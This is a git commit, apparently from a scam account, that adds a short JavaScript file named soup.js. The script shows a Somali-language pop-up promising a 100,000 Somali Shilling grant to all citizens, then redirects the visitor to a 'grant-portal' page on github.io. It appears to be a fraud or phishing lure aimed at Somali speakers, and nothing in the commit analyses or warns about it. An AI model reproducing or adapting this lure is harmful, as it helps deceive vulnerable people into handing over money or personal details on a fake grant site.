c4cc4737f2dc3a0af47abcda478dbc81c9142f3b
offernoww <josiahnyeti16@gmail.com>
2025-02-07 23:54:18 +0100

    Create soup.js

---
+++ soup.js
@@ -0,0 +1,6 @@
+
+var password = '100,000 oo Shilin Soomaali ah'
+password=prompt('SMS :Bilow codsigaga deeqda 100,000 ee Shilinka Soomaaliga ah ee dhammaan muwaadiniinta hadda, guji OK si aad u bilowdo codsiga.  ','100,000 oo Shilin Soomaali ah');
+if (password != '100,000 oo Shilin Soomaali ah') {
+location.href='https://offernoww.github.io/grant-portal.so';
+}
